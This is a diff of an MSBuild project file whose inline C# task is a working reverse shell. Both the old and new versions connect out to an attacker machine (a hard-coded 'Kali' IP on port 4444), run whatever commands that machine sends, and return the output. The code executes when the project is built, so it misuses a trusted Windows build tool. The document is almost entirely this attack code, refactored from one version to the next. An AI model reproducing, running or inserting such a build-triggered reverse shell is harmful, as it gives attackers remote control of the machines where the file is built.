@@ -1,9 +1,9 @@
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="DebugShell">
-    <DebugReverseShell />
+  <Target Name="Connect">
+    <ReverseShell />
   </Target>
   
-  <UsingTask TaskName="DebugReverseShell" TaskFactory="CodeTaskFactory" 
+  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" 
              AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
       <Code Type="Class" Language="cs">
@@ -15,53 +15,51 @@
         using System.IO;
         using System.Threading;
 
-        public class DebugReverseShell : Microsoft.Build.Utilities.Task {
+        public class ReverseShell : Microsoft.Build.Utilities.Task {
             public override bool Execute() {
-                new Thread(() => {
-                    try {
-                        string host = "192.168.1.8";  // ← CHANGE THIS TO YOUR ACTUAL KALI IP
-                        int port = 4444;
+                Thread thread = new Thread(new ThreadStart(StartShell));
+                thread.IsBackground = true;
+                thread.Start();
+                return true;
+            }
+            
+            private void StartShell() {
+                string host = "192.168.1.8";  // CHANGE TO YOUR KALI IP
+                int port = 4444;
+                
+                try {
+                    // Write debug info
+                    File.WriteAllText("C:\\Windows\\Temp\\msbuild.log", "Starting connection to " + host + ":" + port + " at " + DateTime.Now.ToString());
+                    
+                    using(TcpClient client = new TcpClient(host, port)) {
+                        File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnected successfully!");
                         
-                        // Write debug info to file
-                        File.WriteAllText(@"C:\Windows\Temp\debug.log", $"Attempting connection to {host}:{port} at {DateTime.Now}");
-                        
-                        using(TcpClient client = new TcpClient(host, port)) {
-                            File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nConnected successfully at {DateTime.Now}");
+                        using(NetworkStream stream = client.GetStream()) {
+                            // Send welcome message
+                            string welcome = "=== Reverse Shell Connected ===\\n";
+                            byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
+                            stream.Write(welcomeBytes, 0, welcomeBytes.Length);
                             
-                            using(NetworkStream stream = client.GetStream()) {
-                                // Send connection message
-                                string welcome = "=== Reverse Shell Connected ===\n";
-                                byte[] welcomeBytes = Encoding.ASCII.GetBytes(welcome);
-                                stream.Write(welcomeBytes, 0, welcomeBytes.Length);
+                            byte[] buffer = new byte[1024];
+                            int bytesRead;
+                            
+                            while((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0) {
+                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
                                 
-                                byte[] buffer = new byte[1024];
+                                if (command == "exit") break;
+                                if (string.IsNullOrEmpty(command)) continue;
                                 
-                                while(client.Connected) {
-                                    if(stream.DataAvailable) {
-                                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
-                                        if(bytesRead > 0) {
-                                            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
-                                            File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nReceived command: {command}");
-                                            
-                                            if(command == "exit") break;
-                                            if(string.IsNullOrEmpty(command)) continue;
-                                            
-                                            string result = ExecuteCommand(command);
-                                            byte[] output = Encoding.ASCII.GetBytes(result);
-                                            stream.Write(output, 0, output.Length);
-                                        }
-                                    }
-                                    Thread.Sleep(100);
-                                }
+                                string result = ExecuteCommand(command);
+                                byte[] output = Encoding.ASCII.GetBytes(result);
+                                stream.Write(output, 0, output.Length);
+                                stream.Flush();
                             }
                         }
-                        File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nConnection closed at {DateTime.Now}");
-                    } catch (Exception ex) {
-                        File.AppendAllText(@"C:\Windows\Temp\debug.log", $"\nError: {ex.Message}");
                     }
-                }) { IsBackground = true }.Start();
-                
-                return true;
+                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nConnection closed normally");
+                } catch (Exception ex) {
+                    File.AppendAllText("C:\\Windows\\Temp\\msbuild.log", "\nError: " + ex.Message);
+                }
             }
             
             private string ExecuteCommand(string command) {
@@ -79,9 +77,13 @@
                     string error = process.StandardError.ReadToEnd();
                     process.WaitForExit();
                     
-                    return output + error;
+                    if (!string.IsNullOrEmpty(error)) {
+                        output = output + "\\n" + error;
+                    }
+                    
+                    return output;
                 } catch (Exception ex) {
-                    return $"Error executing command: {ex.Message}\n";
+                    return "Error executing command: " + ex.Message + "\\n";
                 }
             }
         }
